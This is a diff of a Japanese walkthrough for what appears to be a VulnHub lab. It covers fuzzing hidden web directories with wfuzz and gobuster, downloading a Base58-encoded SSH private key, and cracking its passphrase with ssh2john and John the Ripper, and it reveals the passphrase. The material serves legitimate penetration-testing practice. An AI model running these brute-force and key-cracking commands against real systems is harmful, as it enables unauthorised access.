@@ -12,10 +12,14 @@
 - ~myfilesを見ても`404 error`になる  
 
 ### 隠しディレクトリを探す
-- `wfuzz -c -z file,/home/user/vulnhub/SecLists-master/Discovery/Web-Content/raft-large-directories.txt  --hc 404 "http://$IP/~FUZZ/"`
+- `wfuzz -c -z file,/home/user/vulnhub/SecLists-master/Discovery/Web-Content/raft-large-directories.txt  "http://$IP/~FUZZ/"`
   - `-c`でカラー表示
   - `-z file,`は辞書の指定だが、わかりにくいので`-w`でいい
+  - 初めは`--h?`をつけずに実行して関係なさそうなのを探す。ここでは404のステータスコードを返しているので`--hc 404`をつける
 - 見つかったファイルは`secret` `myfiles`、時間が長いので2つ見つけたら止める
+- `wfuzz -c -z file,/home/user/vulnhub/SecLists-master/Discovery/Web-Content/raft-large-directories.txt  --hc 404 "http://$IP/~FUZZ/"`
+  - helpを見て`--h?`を他に行や単語数、文字数でもやってみる 
+
 - (別解)
 - `gobuster fuzz -u http://$IP/~FUZZ -w /usr/share/wordlists/dirb/common.txt -b 404`
   - `secret` 異なる辞書を使っている 
@@ -42,33 +46,51 @@
 
 ### 隠しファイルを探す
 - 本来は辞書のファイルを使うが、ここで欲しいのは秘密鍵のファイルで拡張子が`.txt`なので、上で作った、パスワードファイルのrockyou.txtを使う
-- また隠れファイルなので頭に`.`をつける
+- また隠れファイルなので頭に`.`をつける。正直、これだけのヒントでFUZZの頭にドットをつけるのに気づくのは難しいと思う
 - `wfuzz -c -z file,./custom_rockyou.txt --hc 400,404 "http://$IP/~secret/.FUZZ.txt"`
   - `--hc`statusの400,404は表示させない 
 - (別解)
 - `gobuster fuzz -u http://$IP/~secret/.FUZZ -w /usr/share/wordlists/rockyou.txt -b 404`
+
 ### textのダウンロード
 - `curl http://$IP/~secret/.mysecret.txt > .mysecret2.txt`
 - または
 - `curl -OL http://$IP/~secret/.mysecret.txt`
   - `-L`リダイレクト,`-O`標準出力せずにダウンロードする 
 - コピーする
-- CyberChefでペーストして、searchにbase58と入力する。Base58でデコード(復号)する。そして、コピーする
+
+### ファイルを分析
+- ファイルを見た感じでは秘密鍵でなく、何かしらの暗号化されているのはわかるので調べる
+- `cat .mysecret2.txt | grep -o . | sort | uniq | wc`
+- 58なのでBase58
+
+### CyberChefでdecode
+- CyberChefでInputでコピーをペーストする
+- 一番左のsearchに`from base`と入力する。
+- 青色の背景になるのでFrom base32~From base92まで順に文字化けしないのを試していく。その際に真ん中のRecipeに変換するのが出てくるので、ゴミ箱があるので一つ試したらゴミ箱を押して消して次に進んでいく
+- Base58でデコード(復号)する。そして、コピーする
 - `cat > key`で貼り付ける。注意するのは、ペーストしたら改行してから、`ctrl + c`で抜ける
 - Permissionを変更する
   - `chmod 700 key`
   - なぜか`chmod 777 key`にするとsshが繋がらない
 
 ### パスフレーズの解析
-- sshのパスフレーズを解析するのにssh2johnを使うが、Evilboxの時と同じように改良する
-- `github johntheripper bleeding-jumbo ssh2john py`で検索したコードをコピーする
-- `cat > ssh2john_v2.py` ペーストする。注意点は改行してから`ctrl + c`で抜けること
-- `chmod +x ssh2john_v2.py`
-- john the ripperで使えるようにフォーマットを変換する
-  -  `python3 ssh2john_v2.py key > passphrase.txt`
+- 2通りある、片方でやってもいいし最後に同じpassになっているか確認するのもいい
+- (1) コマンドを使う。とても簡単これだけでもいい
+  - `ssh2john key > pass.txt` 
+- (2) スクリプトをダウンロードして使う
+  - sshのパスフレーズを解析するのにssh2johnを使うが、Evilboxの時と同じように改良する
+  - `github johntheripper bleeding-jumbo ssh2john py`で検索したコードをコピーする
+  - `cat > ssh2john_v2.py` ペーストする。注意点は改行してから`ctrl + c`で抜けること
+  - `chmod +x ssh2john_v2.py`
+  - john the ripperで使えるようにフォーマットを変換する
+  -  `python3 ssh2john_v2.py key > pass2.txt`
+- 同じファイルになっているか確認する
+  - `md5sum pass.txt pass2.txt`
+  - 同じハッシュ値になっている
 - 暗号解析
-  - `sudo john passphrase.txt -wordlist=/usr/share/wordlists/fasttrack.txt`
-- パスフレーズが取得できる
+  - `sudo john pass.txt -wordlist=/usr/share/wordlists/fasttrack.txt`
+  - パスフレーズが取得できる
   - `P@55w0rd!` 
 
 ### sshでアクセス
